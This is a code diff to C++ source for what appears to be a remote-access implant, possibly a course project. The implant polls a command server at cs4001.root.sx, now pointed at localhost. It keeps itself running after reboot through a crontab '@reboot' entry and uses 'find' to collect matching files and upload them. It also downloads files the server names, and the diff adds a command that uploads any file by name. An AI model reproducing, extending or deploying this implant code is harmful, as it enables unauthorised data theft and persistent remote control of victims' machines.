@@ -11,7 +11,8 @@
 using namespace std; 
 using namespace rapidjson;
 
-const string HOST_URL = "http://cs4001.root.sx:3000/";
+//const string HOST_URL = "http://cs4001.root.sx:3000/";
+const string HOST_URL = "http://localhost:3000/";
 
 string exec(string cmd, string working_dir=".") {
     array<char, 128> buffer;
@@ -166,12 +167,12 @@ void make_shell_persistence(string filename) {
     exec("echo @reboot " + path + " | crontab -");
 }
 
-void mass_upload(string name, string location, string id) {
+void mass_upload(string url, string name, string location, string id) {
     string output = exec("find " + location + " -type f -name \"" + name + "\"");
     char* token = strtok(const_cast<char*>(output.c_str()), "\n");
 
     while (token != NULL) {
-        upload_file(HOST_URL + "upload", string(token), id);
+        upload_file(url, string(token), id);
         token = strtok(NULL, "\n");
     }
 }
@@ -230,13 +231,13 @@ int main(int argc, char* argv[]) {
                 break;
             } else if(type == "find") {
                 string name = document["data"]["name"].GetString();
-                string location = document["data"]["name"].GetString();
-                mass_upload(name, location, id);
+                string location = document["data"]["dir"].GetString();
+                mass_upload(HOST_URL + "upload", name, location, id);
             } else if (type == "delay") {
                 delay = document["data"].GetInt();
             } else if (type == "download") {
                 string url = document["data"]["url"].GetString();
-                string location = document["data"]["location"].GetString();
+                string location = document["data"]["dir"].GetString();
                 string filename = url.substr(url.find_last_of('/')+1);
 
                 if (location.empty()) { // default to cwd
@@ -249,6 +250,9 @@ int main(int argc, char* argv[]) {
                 post(HOST_URL + "output", "id=" + id + "&output=" + location);
 
                 download_file(url, location);
+            } else if (type == "upload") {
+                string filename = document["data"].GetString();
+                upload_file(HOST_URL + "upload", filename, id);
             }
         }
 
